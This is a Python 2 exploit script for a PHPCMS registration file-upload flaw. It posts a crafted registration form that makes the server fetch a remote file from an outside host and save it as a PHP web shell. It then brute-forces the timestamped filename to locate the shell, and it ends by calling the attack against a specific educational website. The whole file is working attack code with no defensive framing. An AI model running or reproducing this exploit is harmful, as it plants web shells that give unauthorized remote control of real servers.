import requests
import datetime
import sys
import pytz

def getshell(target):
	vuln_url = target + "/index.php?m=member&c=index&a=register&siteid=1"
	data = {
		"dosubmit":1,
		"modelid":11,
		"username":"xx1231231yu",
		"password":"xi123123u123",
		"email":"1462222@qq.com",
		"info[content]":"<img src=http://uploadimg.koolearn.com/upload/2017-04-09/111ea061203739297dd26937705ebb7c.txt?.php#.jpg"
	}
	re = requests.post(vuln_url,data=data)
	data_GMT = re.headers.get('Date')	
	date = datetime.datetime.strptime( data_GMT, "%a, %d %b %Y %H:%M:%S GMT").replace(tzinfo=pytz.utc).astimezone(pytz.timezone("Asia/Shanghai")).strftime("%Y%m%d%I%M%S")
	date = int(date)+1 	#服务器端延迟时间一般为0-3s
	for i in xrange(0,1000):
		filename = str(date) + "%03d" % i
		shell_url = target + "/uploadfile"+datetime.datetime.now().strftime("/%Y/%m%d/") + filename + '.php'
		r = requests.get(shell_url)
		if r.status_code == 200:
			print target + "/uploadfile"+datetime.datetime.now().strftime("/%Y/%m%d/") + filename + '.php'
			break


getshell("http://tech.jlai.edu.cn")	